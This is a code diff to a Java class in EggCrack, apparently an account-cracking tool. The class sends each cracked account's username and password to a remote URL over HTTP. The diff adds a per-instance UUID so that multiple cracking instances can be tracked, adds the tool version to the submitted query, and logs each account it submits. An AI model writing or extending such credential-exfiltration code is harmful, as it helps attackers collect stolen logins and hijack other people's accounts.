@@ -1,5 +1,6 @@
 package net.teamlixo.eggcrack.account.output;
 
+import net.teamlixo.eggcrack.EggCrack;
 import net.teamlixo.eggcrack.account.Account;
 import net.teamlixo.eggcrack.credential.Credential;
 
@@ -8,9 +9,17 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.util.UUID;
 
 public class UrlAccountOutput extends AccountOutput {
+    /**
+     * Generate a random UUID for this instance of the program. Can be used to track
+     * multiple instances at once.
+     */
+    private static final UUID INSTANCE_UUID = UUID.randomUUID();
+
     private static final String CHARSET = "UTF-8";
+
     private final URL url;
 
     public UrlAccountOutput(URL url) {
@@ -20,9 +29,11 @@ public class UrlAccountOutput extends AccountOutput {
     @Override
     public void save(Account account, Credential credential) throws IOException {
         String query = String.format(
-                "username=%s&password=%s",
+                "username=%s&password=%s&uuid=%s&version=%s",
                 URLEncoder.encode(account.getUsername(), CHARSET),
-                URLEncoder.encode(credential.toString(), CHARSET)
+                URLEncoder.encode(credential.toString(), CHARSET),
+                URLEncoder.encode(INSTANCE_UUID.toString(), CHARSET),
+                URLEncoder.encode(Integer.toString(EggCrack.getInstance().getVersion()), CHARSET)
         );
 
         synchronized (url) {
@@ -46,6 +57,9 @@ public class UrlAccountOutput extends AccountOutput {
             if (urlConnection.getResponseCode() / 100 != 2)
                 throw new IOException("Request failed (HTTP " + urlConnection.getResponseCode() + "): "
                         + urlConnection.getResponseMessage());
+
+            EggCrack.LOGGER.fine("Account " + account.getUsername()
+                    + " submitted to URL \"" + url.toExternalForm() + "\".");
 
             //Safely close the connection.
             urlConnection.getInputStream().close();
